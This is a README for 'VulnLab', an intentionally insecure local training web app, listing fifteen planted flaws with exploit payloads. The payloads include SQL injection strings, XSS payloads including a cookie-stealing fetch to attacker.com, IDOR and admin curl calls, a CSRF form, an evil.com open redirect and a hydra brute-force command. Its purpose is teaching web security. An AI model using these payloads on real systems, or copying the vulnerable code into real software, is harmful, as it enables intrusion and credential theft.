# 🔓 VulnLab — Deliberately Vulnerable Web Application

> ⚠️ **FOR EDUCATIONAL PURPOSES ONLY — RUN LOCALLY, NEVER EXPOSE TO THE INTERNET**

A deliberately insecure web application for learning bug bounty hunting, penetration testing, and web security concepts.

---

## 🚀 Setup & Installation

### Prerequisites
- Node.js v14+ installed
- npm

### Steps

```bash
# 1. Install dependencies
npm install

# 2. Start the server
npm start

# 3. Open in browser
open http://localhost:3000
```

The app will automatically create a SQLite database with sample users on first run.

---

## 🧑‍💻 Sample Accounts

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| alice | password123 | user |
| bob | bob1234 | user |
| charlie | charlie99 | user |
| moderator | mod_pass | moderator |

---

## 🎯 Vulnerability Index

### 1. 💉 SQL Injection — Login Form
**Location:** `POST /api/login` → `server.js` line ~70

**What's vulnerable:**
The login query directly concatenates user input:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**How to exploit:**
- Username: `' OR '1'='1' --`
- Password: anything
- This bypasses authentication entirely

**Also try:**
- `' OR 1=1--`
- `admin'--` (login as admin without password)
- Error-based SQLi to extract data

---

### 2. 📜 Stored XSS — Comment Section
**Location:** `POST /api/comments` → Dashboard page

**What's vulnerable:**
Comments are stored raw and rendered via `innerHTML`:
```javascript
list.innerHTML = comments.map(c => `<div>${c.content}</div>`).join('');
```

**Payloads to try:**
```html
<script>alert('Stored XSS!')</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<iframe src="javascript:alert('XSS')">
```

**Advanced:** Steal session cookies:
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

---

### 3. 🔍 Reflected XSS — Search Bar
**Location:** `GET /api/search?q=` → Dashboard

**What's vulnerable:**
The search term is reflected into the response message without HTML encoding.

**Payloads:**
```
/api/search?q=<script>alert(1)</script>
/dashboard → search box → <img src=x onerror=alert(document.cookie)>
```

---

### 4. 🔑 IDOR — User Data Access
**Location:** `GET /api/users/:id`

**What's vulnerable:**
No authorization check — any user can read any other user's data including passwords.

**How to exploit:**
```bash
curl http://localhost:3000/api/users/1   # admin's data + password
curl http://localhost:3000/api/users/2   # alice's data
```

**IDOR Write:**
```bash
curl -X PUT http://localhost:3000/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"bio":"hacked","email":"attacker@evil.com"}'
```

---

### 5. 📁 Unrestricted File Upload
**Location:** `POST /api/upload` → Upload page

**What's vulnerable:**
- No MIME type validation
- No extension whitelist
- Original filename preserved
- Files served publicly

**How to exploit:**
1. Upload `shell.html` with XSS payload — access at `/uploads/shell.html`
2. Upload `malware.js` — served as JavaScript
3. Try filename `../index.html` for path traversal

---

### 6. 🚪 Broken Access Control — Admin Panel
**Location:** `GET /api/admin/users`, `/api/admin/logs`

**What's vulnerable:**
Admin API endpoints don't verify the user's role. Anyone can call them.

```bash
# Get all users with passwords (no auth needed)
curl http://localhost:3000/api/admin/users

# Get hardcoded secrets
curl http://localhost:3000/api/admin/logs
```

---

### 7. 🔐 Hardcoded Credentials
**Location:** `server.js` top of file

```javascript
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'admin123';
const SECRET_KEY = 'supersecretkey123';
```

Also exposed via `/api/admin/logs` and `/api/debug`.

---

### 8. 🔄 CSRF — Money Transfer & Password Change
**Location:** `POST /api/transfer`, `POST /api/change-password`

**What's vulnerable:**
No CSRF token. An attacker can create a page that auto-submits a form to these endpoints.

**CSRF PoC (save as attack.html, open in browser while logged in):**
```html
<form id="csrf" action="http://localhost:3000/api/change-password" method="POST">
  <input name="user_id" value="2">
  <input name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
```

---

### 9. 🍪 Insecure Session Cookies
**Location:** `server.js` session config + cookie settings

**Issues:**
- `httpOnly: false` → readable via JavaScript: `document.cookie`
- `secure: false` → sent over HTTP
- `maxAge: 1 year` → no expiration
- Session token contains username in plaintext: `token_1_admin`

**Check in browser console:**
```javascript
document.cookie  // shows all cookies including session data
```

---

### 10. 📡 Sensitive Data Exposure
**Open endpoints (no auth required):**
- `GET /api/users` → all users + passwords
- `GET /api/debug` → server secrets, env vars
- `GET /api/admin/logs` → admin credentials, secret keys
- `GET /api/session` → full session object

---

### 11. ↩️ Open Redirect
**Location:** `GET /redirect?url=`

```
http://localhost:3000/redirect?url=https://evil.com
```

Use in phishing: send victims a legit-looking link that redirects to an attacker site.

---

### 12. 🖼️ Clickjacking
**Missing header:** `X-Frame-Options`

The app can be embedded in an iframe on any page:
```html
<iframe src="http://localhost:3000/login" width="800" height="600"></iframe>
```

---

### 13. 📂 Directory Listing
**Location:** `GET /uploads/`

All uploaded files are listed and accessible at `http://localhost:3000/uploads/`

---

### 14. 🐛 Debug Mode / Information Disclosure
**Location:** `GET /api/debug`

Returns: Node version, environment variables, working directory, secret keys, admin password.

Also: Login errors return the raw SQL query to the user.

---

### 15. 🔓 No Rate Limiting
**Location:** `POST /api/login`, `POST /api/register`

No rate limiting, no CAPTCHA. Automate brute-force with:
```bash
# Using hydra (install separately)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "localhost/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

---

## 📁 Project Structure

```
vulnlab/
├── server.js          ← Main Express server (all vulnerabilities here)
├── package.json
├── data/
│   └── vulnlab.db     ← SQLite database (auto-created)
└── public/
    ├── index.html     ← Home page
    ├── login.html     ← Login (SQLi)
    ├── register.html  ← Register
    ├── dashboard.html ← XSS, CSRF, IDOR demos
    ├── profile.html   ← IDOR, CSRF
    ├── admin.html     ← Broken access control
    ├── upload.html    ← Unrestricted upload
    ├── uploads/       ← Uploaded files (directory listing on)
    ├── css/style.css
    └── js/app.js
```

---

## ⚠️ Legal Disclaimer

This application is intentionally insecure and designed for educational use only. It must be run locally and **never deployed to the internet or a shared network**. The authors are not responsible for any misuse.
